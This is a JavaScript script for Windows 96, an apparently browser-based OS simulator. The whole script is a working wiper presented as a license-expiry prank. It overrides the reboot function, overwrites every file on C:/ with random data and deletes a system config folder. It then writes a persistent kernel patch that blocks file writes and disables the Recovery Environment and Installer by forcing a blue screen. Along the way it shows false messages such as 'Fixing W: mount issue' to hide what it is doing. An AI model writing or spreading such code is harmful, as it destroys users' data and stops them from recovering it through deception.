


alert("Your Windows 96 license expired.<br>This is your last session, use it wisely.")
setInterval(()=>{
    w96.sys.reboot=async()=>{
        patch = `

setInterval(async ()=>{w96.FS=null;kutil.sysrom.write=()=>{};kutil.sysrom.rm=()=>{}
toReplace=\`<span style="color: red">
| An error occured whilst launching the logon program (C:/system/local/bin/logon)
| The system will not start if this program is not present.
|
| System halted.<br></span>\`
replaceWith=\`<span style="color: red">
|
| License Expired. Thank you for using Windows 96.
|<br></span>\`
lediv = document.getElementById('convga');
if (lediv) {
lediv.innerHTML = lediv.innerHTML.replace(toReplace, replaceWith);
}
w96.state.processes.forEach((z)=>{
    if(z?.appWindow?.title=="System Recovery Tools"&&w96.isRecovery) {
        document.getElementById(z?.appWindow?.id).remove()
        w96.ui.DialogCreator.alert("The Recovery Environment is disabled on this machine.", {events:{onclose:()=>{w96.sys.renderBSOD("Recovery Environment exited early")}},icon:"error"})
    }
    if(z?.appWindow?.title=="Windows 96 Installer"&&w96.isRecovery) {
        document.getElementById(z?.appWindow?.id).remove()
        w96.ui.DialogCreator.alert("The Windows 96 Emergency Installer is disabled on this machine.", {events:{onclose:()=>{w96.sys.renderBSOD("Emergency Installer exited early")}},icon:"error"})
    }
})
console.clear()
});
`
        document.body.innerHTML="<i style='color:white'>Corrupting Windows 96 installation..</i>"
        async function corrupt( x = "C:/") {
          const entries = await w96.FS.readdir(x);
          function generateRandomString(length = 255) {
              const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
              let result = '';
              for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters[randomIndex];
              }
              return result;
            }
          await Promise.all(entries.map(async (entry) => {
        
            if (!await w96.FS.isFile(entry)) {
              await corrupt(entry);
            } else {
              await w96.FS.writestr(entry,generateRandomString(6784))
            }
          }));
        }
        await corrupt();
        document.body.innerHTML=document.body.innerHTML+"<br><i style='color:white'>Fixing W: mount issue..</i>"
        await w96.FS.rmdir("C:/system/config/SCM")
        document.body.innerHTML=document.body.innerHTML+"<br><i style='color:white'>Writing kernel..</i>"
        kutil.sysrom.write("KINJECT.js",patch)
        setTimeout(()=>{
            document.body.innerHTML=document.body.innerHTML+"<br><i style='color:white'>Rebooting system in 10 seconds. Thank you for using Windows 96.</i>"
            setTimeout(()=>{
                document.location.reload()
            },10000)
        },3000)
    }
});